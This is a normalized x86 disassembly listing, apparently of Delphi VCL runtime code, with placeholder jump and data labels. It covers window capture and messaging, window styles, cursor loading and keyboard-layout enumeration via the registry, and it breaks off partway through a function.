cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45a684
xor edx edx
push ebp
push sub_45848f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_413994
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_4596b4
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_4525b4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45846d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_458134
xor edx edx
push ebp
push sub_4583cc
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_458094
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45b490
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4423cc
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4583d3
mov eax [ ebp - 0x4 ]
call sub_45812c
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_4583d3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458477
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4596b4
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_4596b4
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_413910
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_413a5c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_452668
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4584bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4584bc
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45852c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_4584bc
pop ecx
mov eax [ esi + 0x34 ]
call sub_44d9cc
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_44d9dc
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_4585b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44071c
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403420
sub_4585d4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403420
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_458604
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4585d4
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_458604
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458680
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_4585d4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4585d4
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_458604
pop ecx
test al al
je r-xdata
sub_4586d4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403420
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_458704
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4586d4
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_458704
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43f0c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458780
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_4586d4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_4586d4
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_458704
pop ecx
test al al
je r-xdata
sub_4587d4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_413918
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_448014
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_458828
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_4587d4
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403420
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4588a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_419b80
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_4588e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43c0b0
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43cd98
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_458928
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4426d0
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4423cc
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_4423cc
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4423cc
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4423cc
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4423cc
push eax
call RedrawWindow
sub_458a7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_45382c
mov dl 0x5
mov eax ebx
call sub_4555a0
mov dl 0x1
mov eax ebx
call sub_440fa8
mov dl 0x3
mov eax ebx
call sub_45589c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_458ae4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_458bbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_440e68
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_440cd4
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43b0e0
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bb40
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_40404c
mov eax [ ebp - 0xc ]
call sub_40421c
push eax
mov eax [ ebp - 0xc ]
call sub_40441c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43bb50
mov eax [ ebp - 0xc ]
call sub_40421c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458bc2
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
mov dl 0x1
mov eax esi
call sub_454c20
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43bbfc
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4045a8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_458be8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_43f0fc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_454344
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_43f0c0
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403420
inc ebp
dec edi
jne r-xdata
sub_458c34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_440e68
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_458c60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441670
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_458c88
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_456ff0
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4423cc
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_440e68
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4423cc
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4423cc
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_440e7c
or ecx 0xffffffff
mov dl 0x1
call sub_43c28c
pop esi
pop ebx
retn
sub_458d20
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_441ae0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43cd98
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43b56c
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403420
sub_458d78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_458e3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43bb40
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40404c
mov eax [ ebp - 0x4 ]
call sub_40421c
push eax
mov eax [ ebp - 0x4 ]
call sub_40441c
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43bb50
mov eax [ ebp - 0x4 ]
call sub_40421c
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43bbfc
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458e45
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_454c20
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045a8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_458e64
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_441860
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_440e68
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_440e7c
mov dl [ ebx + 0x57 ]
call sub_43baec
inc edi
dec esi
jne r-xdata
sub_458f08
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_458f38
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_458f68
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4193f0
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45930c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_459318
mov eax ebx
call sub_459324
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_455740
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c2f0
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c2f0
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c2f0
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_459744
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_459620
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_459620
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_459620
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_4590c0
push ebx
push esi
push edi
push ebp
call sub_403598
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403224
mov eax [ ebp + 0x88 ]
call sub_403224
mov eax [ ebp + 0x84 ]
call sub_403224
mov eax [ ebp + 0x54 ]
call sub_403224
mov eax [ ebp + 0x50 ]
call sub_403224
mov eax [ ebp + 0x4c ]
call sub_403224
mov eax [ ebp + 0x30 ]
call sub_403224
mov eax [ ebp + 0x34 ]
call sub_403224
mov eax [ ebp + 0x7c ]
call sub_403224
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403224
mov eax ebp
call sub_459380
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41943c
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403580
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_413918
call sub_403224
inc edi
dec esi
jne r-xdata
sub_459238
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_459284
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4137bc
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4137bc
mov eax [ rw-data ]
call sub_45c010
sub_4592bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413a5c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413a5c
mov eax [ rw-data ]
call sub_45c010
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_443984
sub_459324
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_4593dc
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_459380
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026dc
mov ebx esi
test ebx ebx
jne r-xdata
sub_4593dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_459404
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4595af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4595b6
lea eax [ ebp - 0x260 ]
call sub_403f5c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403f5c
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_4155e0
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408af0
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4470e8
test al al
je r-xdata
xor eax eax
push ebp
push sub_45956b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
